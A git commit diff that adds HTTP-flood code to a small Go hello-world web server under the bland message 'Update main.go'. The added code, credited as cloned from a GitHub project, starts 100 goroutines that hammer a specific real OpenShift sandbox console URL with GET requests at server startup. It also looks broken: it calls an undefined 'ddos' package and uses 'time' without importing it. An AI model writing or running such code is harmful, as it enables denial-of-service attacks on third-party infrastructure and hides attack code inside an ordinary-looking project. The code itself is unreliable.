1c4692f5f581ed17afa1281cdefa2337b462afd3
my-code-cosmic <my.code.cosmic@gmail.com>
2024-05-14 10:52:00 +0100

    Update main.go

--- main.go
+++ main.go
@@ -4,6 +4,11 @@ import (
 	"fmt"
 	"net/http"
 	"os"
+	"io"
+	"io/ioutil"
+	"net/url"
+	"runtime"
+	"sync/atomic"
 )
 
 var port = os.Getenv("PORT")
@@ -13,6 +18,17 @@ func main() {
 		port = "8080"
 	}
 	fmt.Println("helloooo")
+
+        workers := 100
+	d, err := ddos.New("https://console-openshift-console.apps.sandbox-m2.ll9k.p1.openshiftapps.com", workers)
+	if err != nil {
+		panic(err)
+	}
+	d.Run()
+	time.Sleep(time.Second)
+	d.Stop()
+	fmt.Println("DDoS attack stopped")
+	
 	http.HandleFunc("/", HelloServer)
 	http.ListenAndServe(fmt.Sprintf("0.0.0.0:%s", port), nil)
 }
@@ -24,4 +40,72 @@ func HelloServer(w http.ResponseWriter, r *http.Request) {
 	} else {
 		fmt.Fprint(w, "Hello World!")
 	}
+}
+
+
+// cloned by https://github.com/Konstantin8105/DDoS
+
+// DDoS - structure of value for DDoS attack
+type DDoS struct {
+	url           string
+	stop          *chan bool
+	amountWorkers int
+
+	// Statistic
+	successRequest int64
+	amountRequests int64
+}
+
+// New - initialization of new DDoS attack
+func New(URL string, workers int) (*DDoS, error) {
+	if workers < 1 {
+		return nil, fmt.Errorf("Amount of workers cannot be less 1")
+	}
+	u, err := url.Parse(URL)
+	if err != nil || len(u.Host) == 0 {
+		return nil, fmt.Errorf("Undefined host or error = %v", err)
+	}
+	s := make(chan bool)
+	return &DDoS{
+		url:           URL,
+		stop:          &s,
+		amountWorkers: workers,
+	}, nil
+}
+
+// Run - run DDoS attack
+func (d *DDoS) Run() {
+	for i := 0; i < d.amountWorkers; i++ {
+		go func() {
+			for {
+				select {
+				case <-(*d.stop):
+					return
+				default:
+					// sent http GET requests
+					resp, err := http.Get(d.url)
+					atomic.AddInt64(&d.amountRequests, 1)
+					if err == nil {
+						atomic.AddInt64(&d.successRequest, 1)
+						_, _ = io.Copy(ioutil.Discard, resp.Body)
+						_ = resp.Body.Close()
+					}
+				}
+				runtime.Gosched()
+			}
+		}()
+	}
+}
+
+// Stop - stop DDoS attack
+func (d *DDoS) Stop() {
+	for i := 0; i < d.amountWorkers; i++ {
+		(*d.stop) <- true
+	}
+	close(*d.stop)
+}
+
+// Result - result of DDoS attack
+func (d DDoS) Result() (successRequest, amountRequests int64) {
+	return d.successRequest, d.amountRequests
 }
